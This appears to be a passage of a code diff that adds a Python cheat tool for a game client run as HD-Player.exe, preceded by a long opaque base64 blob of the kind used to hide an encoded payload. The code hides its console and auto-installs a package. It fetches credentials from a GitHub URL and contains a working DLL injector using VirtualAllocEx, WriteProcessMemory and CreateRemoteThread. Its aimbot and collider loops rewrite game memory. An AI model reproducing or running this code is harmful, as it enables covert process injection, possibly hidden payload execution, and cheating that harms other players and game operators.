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'))
+#!/usr/bin/env python
+# GHOST-XS STREAMER - FINAL WITH CLEAN SCAN + POWER SLIDER + EMBED DLL SPACE
+# SCAN ONLY - NO AUTO ACTIVATION
+
+import os
+import sys
+import time
+import socket
+import threading
+import ctypes
+import requests
+import subprocess
+import hashlib
+import json
+import base64
+import tempfile
+import struct
+from ctypes import wintypes
+from http.server import HTTPServer, BaseHTTPRequestHandler
+from urllib.parse import urlparse
+import win32api
+import win32con
+
+# Hide console
+if sys.platform == "win32":
+    try:
+        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+    except:
+        pass
+
+# ==================== WINDOWS API ====================
+kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
+user32 = ctypes.WinDLL('user32', use_last_error=True)
+
+PROCESS_ALL_ACCESS = 0x1F0FFF
+PROCESS_CREATE_THREAD = 0x0002
+PROCESS_QUERY_INFORMATION = 0x0400
+PROCESS_VM_OPERATION = 0x0008
+PROCESS_VM_WRITE = 0x0020
+PROCESS_VM_READ = 0x0010
+MEM_COMMIT = 0x00001000
+MEM_RESERVE = 0x00002000
+PAGE_READWRITE = 0x04
+PAGE_EXECUTE_READWRITE = 0x40
+
+# ==================== GITHUB AUTH URL ====================
+GITHUB_AUTH_URL = "https://raw.githubusercontent.com/Ghostxs90/Sid/main/Sid.txt"
+
+# ==================== MEMORY FUNCTIONS ====================
+try:
+    from pymem import Pymem
+    from pymem.memory import read_bytes, write_bytes
+    from pymem.pattern import pattern_scan_all
+    PYMEM_OK = True
+except ImportError:
+    PYMEM_OK = False
+    print("[!] PyMem not installed - run: pip install pymem")
+    try:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "pymem"])
+        from pymem import Pymem
+        from pymem.memory import read_bytes, write_bytes
+        from pymem.pattern import pattern_scan_all
+        PYMEM_OK = True
+    except:
+        pass
+
+# ==================== EMBEDDED DLL - PASTE YOUR BASE64 HERE ====================
+EMBEDDED_DLL_BASE64 = """
+PASTE_YOUR_BASE64_ENCODED_DLL_HERE
+"""
+
+# ==================== GLOBAL VARIABLES ====================
+aimbot_addresses = []
+aimbot_original_values = {}
+aimbot_active = False
+current_aim_mode = None
+last_aim_time = 0
+
+# DRAG MODE VARIABLES
+drag_mode_active = False
+drag_current_mode = None
+drag_power = 50
+drag_last_pos = (0, 0)
+drag_threshold = 25
+
+collider_addresses = []
+collider_original_values = {}
+collider_active = False
+
+hotkey_state = {
+    "hold_key": None,
+    "selected_aimbot": "Head",
+    "hold_active": False,
+    "delay": 50
+}
+
+current_target_process = "HD-Player.exe"
+authenticated_users = {}
+player_count = 0
+
+# ==================== GET COMPUTER SID ====================
+def get_computer_sid():
+    try:
+        import win32security
+        import win32api
+        hToken = win32security.OpenProcessToken(
+            win32api.GetCurrentProcess(),
+            win32con.TOKEN_QUERY
+        )
+        sid = win32security.GetTokenInformation(hToken, win32security.TokenUser)[0]
+        return win32security.ConvertSidToStringSid(sid)
+    except:
+        try:
+            result = subprocess.run(['wmic', 'useraccount', 'where', 'name="%username%"', 'get', 'sid'], 
+                                   capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            lines = result.stdout.strip().split('\n')
+            for line in lines:
+                if 'S-1-5-21' in line:
+                    return line.strip()
+        except:
+            pass
+        return "S-1-5-21-123456789-123456789-123456789-500"
+
+# ==================== FETCH CREDENTIALS ====================
+def fetch_credentials():
+    creds = {}
+    try:
+        headers = {
+            'Cache-Control': 'no-cache, no-store, must-revalidate',
+            'Pragma': 'no-cache',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        }
+        response = requests.get(GITHUB_AUTH_URL, headers=headers, timeout=10)
+        if response.status_code == 200:
+            lines = response.text.strip().split('\n')
+            user = passw = sid = ""
+            for line in lines:
+                line = line.strip()
+                if 'Username=' in line:
+                    user = line.split('=')[1].strip()
+                elif 'Password=' in line:
+                    passw = line.split('=')[1].strip()
+                elif 'sid=' in line:
+                    sid = line.split('=')[1].strip()
+                    if user and passw and sid:
+                        creds[user] = (passw, sid)
+                    user = passw = sid = ""
+    except:
+        pass
+    return creds
+
+# ==================== PATTERN CONVERTER ====================
+def mkp(aob):
+    if '??' in aob:
+        if aob.startswith("??"):
+            aob = f" {aob}"
+            n = aob.replace(" ??", ".").replace(" ", "\\x")
+            return bytes(n.encode())
+        else:
+            n = aob.replace(" ??", ".").replace(" ", "\\x")
+            return bytes(f"\\x{n}".encode())
+    else:
+        m = aob.replace(" ", "\\x")
+        return bytes(f"\\x{m}".encode())
+
+# ==================== EXTRACT AND INJECT EMBEDDED DLL ====================
+def extract_and_inject_dll(process_name):
+    """Extract embedded DLL and manually map inject"""
+    try:
+        if not EMBEDDED_DLL_BASE64 or EMBEDDED_DLL_BASE64.strip() == "PASTE_YOUR_BASE64_ENCODED_DLL_HERE":
+            return "No embedded DLL found - please add your DLL base64"
+        
+        dll_bytes = base64.b64decode(EMBEDDED_DLL_BASE64.strip())
+        
+        pid = None
+        import psutil
+        for proc in psutil.process_iter(['pid', 'name']):
+            if proc.info['name'] and proc.info['name'].lower() == process_name.lower():
+                pid = proc.info['pid']
+                break
+        
+        if not pid:
+            return f"Process {process_name} not found"
+        
+        handle = kernel32.OpenProcess(
+            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
+            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
+            False, pid
+        )
+        
+        if not handle:
+            return "Failed to open process"
+        
+        dll_size = len(dll_bytes)
+        allocated_mem = kernel32.VirtualAllocEx(
+            handle, None, dll_size,
+            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
+        )
+        
+        if not allocated_mem:
+            kernel32.CloseHandle(handle)
+            return "Failed to allocate memory"
+        
+        bytes_written = ctypes.c_size_t()
+        result = kernel32.WriteProcessMemory(
+            handle, allocated_mem, dll_bytes, dll_size,
+            ctypes.byref(bytes_written)
+        )
+        
+        if not result or bytes_written.value != dll_size:
+            kernel32.VirtualFreeEx(handle, allocated_mem, 0, MEM_RELEASE)
+            kernel32.CloseHandle(handle)
+            return "Failed to write DLL"
+        
+        try:
+            dos_header = dll_bytes[:64]
+            e_lfanew = struct.unpack('<I', dos_header[60:64])[0]
+            entry_point_rva = struct.unpack('<I', dll_bytes[e_lfanew + 40:e_lfanew + 44])[0]
+            entry_point = allocated_mem + entry_point_rva
+        except:
+            entry_point = allocated_mem
+        
+        thread_id = ctypes.c_ulong()
+        thread = kernel32.CreateRemoteThread(
+            handle, None, 0,
+            ctypes.c_void_p(entry_point),
+            allocated_mem, 0, ctypes.byref(thread_id)
+        )
+        
+        if not thread:
+            kernel32.VirtualFreeEx(handle, allocated_mem, 0, MEM_RELEASE)
+            kernel32.CloseHandle(handle)
+            return "Failed to create remote thread"
+        
+        kernel32.WaitForSingleObject(thread, 5000)
+        kernel32.CloseHandle(thread)
+        kernel32.CloseHandle(handle)
+        
+        return f"DLL manually mapped into {process_name} (PID: {pid}) - {dll_size} bytes"
+        
+    except Exception as e:
+        return f"Manual map failed: {str(e)}"
+
+# ==================== SCAN FUNCTION - CLEAN SCAN, NO ACTIVATION ====================
+def HEADLOAD():
+    global aimbot_addresses, collider_addresses, player_count
+    
+    aimbot_addresses = []
+    aimbot_original_values = {}
+    collider_addresses = []
+    collider_original_values = {}
+    player_count = 0
+    
+    if not PYMEM_OK:
+        return "PyMem not installed"
+    
+    try:
+        proc = Pymem(current_target_process)
+    except Exception as e:
+        return f"Game not found - Launch {current_target_process} first"
+
+    try:
+        aimbot_pattern = mkp("FF FF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 FF FF FF FF FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 A5 43")
+        aimbot_addresses = pattern_scan_all(proc.process_handle, aimbot_pattern, return_multiple=True)
+        
+        collider_pattern = mkp("FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 FF FF FF FF FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 A5 43")
+        collider_addresses = pattern_scan_all(proc.process_handle, collider_pattern, return_multiple=True)
+        
+        valid_players = 0
+        temp_valid_addresses = []
+        
+        for addr in aimbot_addresses:
+            try:
+                val = read_bytes(proc.process_handle, addr + 0xA6, 4)
+                val2 = read_bytes(proc.process_handle, addr + 0xAA, 4)
+                if any(v != 0 for v in val) or any(v != 0 for v in val2):
+                    valid_players += 1
+                    temp_valid_addresses.append(addr)
+            except:
+                pass
+        
+        aimbot_addresses = temp_valid_addresses
+        player_count = valid_players
+        
+        proc.close_process()
+        
+        return f"SCANNING WITH ADV METHOD\nSCAN DONE\n{player_count} ENTITIES FOUND"
+        
+    except Exception as e:
+        return f"Scan failed: {str(e)}"
+
+# ==================== DRAG MODE FUNCTIONS ====================
+def set_drag_power(power):
+    global drag_power, drag_threshold
+    drag_power = max(0, min(100, power))
+    drag_threshold = int(drag_power / 2)
+    return f"Drag power set to {power}% ({drag_threshold} pixels)"
+
+def leftShoulderOn():
+    global drag_mode_active, drag_current_mode, drag_last_pos
+    global aimbot_active, current_aim_mode, collider_active
+    
+    if not aimbot_addresses:
+        return "No players - scan first"
+    
+    aimbot_active = False
+    current_aim_mode = None
+    collider_active = False
+    
+    drag_mode_active = True
+    drag_current_mode = "LEFT"
+    
+    class POINT(ctypes.Structure):
+        _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
+    point = POINT()
+    user32.GetCursorPos(ctypes.byref(point))
+    drag_last_pos = (point.x, point.y)
+    
+    return "Left Shoulder mode enabled (drag to activate)"
+
+def rightShoulderOn():
+    global drag_mode_active, drag_current_mode, drag_last_pos
+    global aimbot_active, current_aim_mode, collider_active
+    
+    if not aimbot_addresses:
+        return "No players - scan first"
+    
+    aimbot_active = False
+    current_aim_mode = None
+    collider_active = False
+    
+    drag_mode_active = True
+    drag_current_mode = "RIGHT"
+    
+    class POINT(ctypes.Structure):
+        _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
+    point = POINT()
+    user32.GetCursorPos(ctypes.byref(point))
+    drag_last_pos = (point.x, point.y)
+    
+    return "Right Shoulder mode enabled (drag to activate)"
+
+def ENABLE_NECK():
+    global current_aim_mode, aimbot_active
+    global drag_mode_active, drag_current_mode, collider_active
+    
+    if not aimbot_addresses:
+        return "No players - scan first"
+    
+    drag_mode_active = False
+    drag_current_mode = None
+    collider_active = False
+    
+    aimbot_active = True
+    current_aim_mode = "NECK"
+    
+    return "NECK mode enabled"
+
+def AimbotAion():
+    global collider_active
+    global aimbot_active, current_aim_mode, drag_mode_active, drag_current_mode
+    
+    if not collider_addresses:
+        return "No collider - scan first"
+    
+    aimbot_active = False
+    current_aim_mode = None
+    drag_mode_active = False
+    drag_current_mode = None
+    
+    collider_active = True
+    
+    return "Collider ON"
+
+def AIMBOT_OFF():
+    global aimbot_original_values, aimbot_active, current_aim_mode
+    global drag_mode_active, drag_current_mode, collider_active, collider_original_values
+    
+    if aimbot_original_values and PYMEM_OK:
+        try:
+            proc = Pymem(current_target_process)
+            for addr, orig in aimbot_original_values.items():
+                try:
+                    write_bytes(proc.process_handle, addr + 0xA6, orig, len(orig))
+                except:
+                    pass
+            proc.close_process()
+            aimbot_original_values.clear()
+        except:
+            pass
+    
+    if collider_original_values and PYMEM_OK:
+        try:
+            proc = Pymem(current_target_process)
+            for base, orig in collider_original_values.items():
+                try:
+                    target_addr = base - 0x368 
+                    write_bytes(proc.process_handle, target_addr, orig, len(orig))
+                except:
+                    pass
+            proc.close_process()
+            collider_original_values.clear()
+        except:
+            pass
+    
+    aimbot_active = False
+    current_aim_mode = None
+    drag_mode_active = False
+    drag_current_mode = None
+    collider_active = False
+    
+    return "All disabled"
+
+def leftShoulderOff():
+    return AIMBOT_OFF()
+
+def rightShoulderOff():
+    return AIMBOT_OFF()
+
+def AimbotAioff():
+    return AIMBOT_OFF()
+
+# ==================== DRAG DETECTION LOOP ====================
+def drag_detection_loop():
+    global drag_last_pos, drag_threshold, aimbot_active, current_aim_mode
+    global drag_mode_active, drag_current_mode, aimbot_original_values
+    
+    while True:
+        if drag_mode_active and drag_current_mode and aimbot_addresses and PYMEM_OK:
+            try:
+                class POINT(ctypes.Structure):
+                    _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
+                point = POINT()
+                user32.GetCursorPos(ctypes.byref(point))
+                
+                drag_x = abs(point.x - drag_last_pos[0])
+                drag_y = abs(point.y - drag_last_pos[1])
+                drag_distance = drag_x + drag_y
+                
+                drag_last_pos = (point.x, point.y)
+                
+                if drag_distance >= drag_threshold:
+                    if drag_current_mode == "LEFT":
+                        current_aim_mode = "LEFT"
+                    elif drag_current_mode == "RIGHT":
+                        current_aim_mode = "RIGHT"
+                    
+                    aimbot_active = True
+                    
+                    try:
+                        proc = Pymem(current_target_process)
+                        for addr in aimbot_addresses:
+                            try:
+                                if addr not in aimbot_original_values:
+                                    aimbot_original_values[addr] = read_bytes(proc.process_handle, addr + 0xA6, 4)
+                                
+                                if current_aim_mode == "LEFT":
+                                    target = read_bytes(proc.process_handle, addr + 0xD6, 4)
+                                elif current_aim_mode == "RIGHT":
+                                    target = read_bytes(proc.process_handle, addr + 0xDA, 4)
+                                else:
+                                    continue
+                                    
+                                write_bytes(proc.process_handle, addr + 0xA6, target, len(target))
+                            except:
+                                pass
+                        proc.close_process()
+                    except:
+                        pass
+                else:
+                    aimbot_active = False
+                    current_aim_mode = None
+                    
+            except Exception as e:
+                pass
+        
+        time.sleep(0.01)
+
+# ==================== AIMBOT LOOP ====================
+def aimbot_loop():
+    global aimbot_original_values
+    last_write = 0
+    
+    while True:
+        if aimbot_active and aimbot_addresses and PYMEM_OK and current_aim_mode:
+            try:
+                current = time.time() * 1000
+                if current - last_write >= 10:
+                    proc = Pymem(current_target_process)
+                    for addr in aimbot_addresses:
+                        try:
+                            if addr not in aimbot_original_values:
+                                aimbot_original_values[addr] = read_bytes(proc.process_handle, addr + 0xA6, 4)
+                            
+                            if current_aim_mode == "NECK":
+                                target = read_bytes(proc.process_handle, addr + 0xAA, 4)
+                            elif current_aim_mode == "LEFT":
+                                target = read_bytes(proc.process_handle, addr + 0xD6, 4)
+                            elif current_aim_mode == "RIGHT":
+                                target = read_bytes(proc.process_handle, addr + 0xDA, 4)
+                            else:
+                                continue
+                                
+                            write_bytes(proc.process_handle, addr + 0xA6, target, len(target))
+                        except:
+                            pass
+                    proc.close_process()
+                    last_write = current
+            except:
+                pass
+        time.sleep(0.005)
+
+# ==================== COLLIDER LOOP ====================
+def collider_loop():
+    global collider_original_values
+    
+    while True:
+        if collider_active and collider_addresses and PYMEM_OK:
+            try:
+                proc = Pymem(current_target_process)
+                for base in collider_addresses:
+                    try:
+                        head_addr = base + 0xF0
+                        target_addr = base - 0x368 
+                        head_val = read_bytes(proc.process_handle, head_addr, 4)
+                        
+                        if all(b == 0 for b in head_val):
+                            continue
+                            
+                        if base not in collider_original_values:
+                            collider_original_values[base] = read_bytes(proc.process_handle, target_addr, 4)
+                            
+                        write_bytes(proc.process_handle, target_addr, head_val, len(head_val))
+                    except:
+                        pass
+                proc.close_process()
+            except:
+                pass
+        time.sleep(0.01)
+
+# ==================== HOTKEY MONITOR WITH DELAY ====================
+def hold_hotkey_monitor():
+    global hotkey_state, aimbot_active, current_aim_mode, collider_active, last_aim_time
+    global drag_mode_active, drag_current_mode
+    
+    vk_map = {
+        'A': 0x41, 'B': 0x42, 'C': 0x43, 'D': 0x44, 'E': 0x45, 'F': 0x46, 'G': 0x47,
+        'H': 0x48, 'I': 0x49, 'J': 0x4A, 'K': 0x4B, 'L': 0x4C, 'M': 0x4D, 'N': 0x4E,
+        'O': 0x4F, 'P': 0x50, 'Q': 0x51, 'R': 0x52, 'S': 0x53, 'T': 0x54, 'U': 0x55,
+        'V': 0x56, 'W': 0x57, 'X': 0x58, 'Y': 0x59, 'Z': 0x5A,
+        '0': 0x30, '1': 0x31, '2': 0x32, '3': 0x33, '4': 0x34, '5': 0x35, '6': 0x36,
+        '7': 0x37, '8': 0x38, '9': 0x39,
+        'F1': 0x70, 'F2': 0x71, 'F3': 0x72, 'F4': 0x73, 'F5': 0x74, 'F6': 0x75,
+        'F7': 0x76, 'F8': 0x77, 'F9': 0x78, 'F10': 0x79, 'F11': 0x7A, 'F12': 0x7B,
+        'Space': 0x20, 'Enter': 0x0D, 'Shift': 0x10, 'Control': 0x11, 'Alt': 0x12,
+        'Tab': 0x09, 'CapsLock': 0x14, 'Escape': 0x1B, 'Backspace': 0x08,
